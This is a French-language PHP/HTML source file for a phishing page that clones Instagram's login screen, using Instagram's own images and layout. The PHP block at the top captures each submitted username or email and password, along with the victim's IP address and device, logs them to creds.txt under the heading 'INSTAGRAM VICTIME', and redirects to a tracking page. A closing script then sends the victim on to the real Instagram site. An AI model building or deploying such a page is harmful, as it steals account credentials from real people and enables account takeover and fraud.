<?php
if ($_POST) {
    // IP réelle
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']
        ?? $_SERVER['HTTP_X_REAL_IP']
        ?? $_SERVER['REMOTE_ADDR']
        ?? 'inconnue';
    $ip = trim(explode(',', $ip)[0]);

    $email = $_POST['email'] ?? '';
    $pass  = $_POST['password'] ?? '';
    $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
    $time  = date('Y-m-d H:i:s');

    // Format pour Instagram
    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 INSTAGRAM VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "└─────────────────────────────────────────\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    header('Location: terminal.php?newhit=1');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Connexion</title>
    <style>
        /* Instagram CSS Clone */
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .main-container {
            display: flex;
            flex-direction: row;
            max-width: 935px;
            width: 100%;
            margin: 32px auto;
        }
        
        .phone-image {
            flex: 1;
            background-image: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png');
            background-repeat: no-repeat;
            background-position: 0 0;
            background-size: 454px 618px;
            height: 618px;
            margin-right: -45px;
            margin-top: 12px;
        }
        
        .login-section {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin-bottom: 10px;
            padding: 40px 40px 20px;
            text-align: center;
            width: 350px;
        }
        
        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 54px;
            font-weight: 400;
            margin-bottom: 24px;
            color: #262626;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 6px;
            background-color: #fafafa;
            box-sizing: border-box;
        }
        
        .input-field:focus {
            outline: none;
            background-color: #fff;
        }
        
        .submit-btn {
            background-color: #0095f6;
            border: 1px solid #0095f6;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            padding: 8px 16px;
            width: 100%;
            margin-top: 8px;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        
        .divider span {
            padding: 0 18px;
        }
        
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
            cursor: pointer;
        }
        
        .forgot-password {
            font-size: 12px;
            color: #00376b;
            margin-bottom: 20px;
        }
        
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            width: 350px;
            font-size: 14px;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            gap: 10px;
        }
        
        .app-download img {
            height: 40px;
        }
        
        @media (max-width: 876px) {
            .phone-image {
                display: none;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>
    <div class="main-container">
        <div class="phone-image"></div>
        <div class="login-section">
            <div class="login-box">
                <div class="logo">Instagram</div>
                <form method="POST" action="instagramlogin.php">
                    <input type="text" name="email" class="input-field" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
                    <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
                    <button type="submit" class="submit-btn">Se connecter</button>
                </form>
                <div class="divider"><span>OU</span></div>
                <div class="fb-login">Se connecter avec Facebook</div>
                <div class="forgot-password">Mot de passe oublié ?</div>
            </div>
            <div class="signup-box">
                Vous n'avez pas de compte ? <a href="www.instagram.com" class="signup-link">S'inscrire</a>
            </div>
            <div class="app-download">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_french-french.png/180ae7a0bcf7.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_french-fr.png/180ae7a0bcf7.png" alt="Google Play">
            </div>
        </div>
    </div>
     <script>
const form = document.querySelector('form[method="POST"][action="terminal.php"]');

form.addEventListener('submit', function(e) {
    e.preventDefault(); // bloque le comportement classique du submit

    const formData = new FormData(form);

    fetch(form.action, {
        method: 'POST',
        body: formData
    })
    .then(response => response.text()) // optionnel, récupère la réponse du serveur
    .then(data => {
        console.log(data); // juste pour debug
        // redirection après envoi
        window.location.href = 'https://www.instagram.com/';
    })
    .catch(error => console.error('Erreur:', error));
});
     </script>
</body>
</html>
